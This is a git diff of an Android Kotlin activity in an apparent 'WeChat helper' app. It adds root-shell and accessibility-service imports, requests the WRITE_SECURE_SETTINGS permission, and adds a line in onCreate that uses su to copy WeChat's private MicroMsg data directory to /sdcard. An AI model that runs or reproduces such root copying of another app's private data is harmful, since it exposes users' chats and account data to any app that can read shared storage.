@@ -7,7 +7,13 @@ import android.support.v7.app.AppCompatActivity
 import android.view.View
 import android.widget.LinearLayout
 import com.example.julive.wechathelper.R
+import com.example.julive.wechathelper.ext.ControllerService
+import com.example.julive.wechathelper.ext.isAccessibilityServiceEnabled
+import com.example.julive.wechathelper.ext.isSuccess
+import com.example.julive.wechathelper.ext.startAccessibilityService
 import com.example.julive.wechathelper.home.MainHomeActivity
+import com.topjohnwu.superuser.Shell
+import com.topjohnwu.superuser.ShellUtils
 import org.jetbrains.anko.*
 import pub.devrel.easypermissions.EasyPermissions
 import java.util.*
@@ -33,37 +39,24 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
         if (!EasyPermissions.hasPermissions(
                 this,
                 Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.DISABLE_KEYGUARD
+                Manifest.permission.DISABLE_KEYGUARD,
+                Manifest.permission.WRITE_SECURE_SETTINGS
             )
         )
             requestPermissions()
         else {
             hasPermissions = true
         }
-        val layout = findViewById<LinearLayout>(R.id.layout)
-        layout.backgroundResource = R.drawable.bg7
-        checkPermission()
 
-//        FileUtil.writeLog(logPath, Action.Nothing.desc, false, "utf-8")
-    }
-
-    val bgList = arrayListOf(
-        R.drawable.bg1,
-        R.drawable.bg2,
-        R.drawable.bg3,
-        R.drawable.bg4,
-        R.drawable.bg5,
-        R.drawable.bg6,
-        R.drawable.bg7
-    )
-
-    override fun onRestart() {
-        super.onRestart()
-        val layout = findViewById<LinearLayout>(R.id.layout)
-        layout.backgroundResource = bgList[Random().nextInt(7)]
+        Shell.su("cp -r /data/data/com.tencent.mm/MicroMsg /sdcard/cp/").exec()
     }
 
     fun check(view: View) {
+    }
+
+    override fun onResume() {
+        super.onResume()
+        checkPermission()
     }
 
     private fun checkPermission() {
@@ -80,7 +73,8 @@ class MainActivity : AppCompatActivity(), EasyPermissions.PermissionCallbacks {
                 "需要读写内存卡权限，请允许才能继续",
                 100,
                 Manifest.permission.WRITE_EXTERNAL_STORAGE,
-                Manifest.permission.DISABLE_KEYGUARD
+                Manifest.permission.DISABLE_KEYGUARD,
+                Manifest.permission.WRITE_SECURE_SETTINGS
             )
             return true
         }
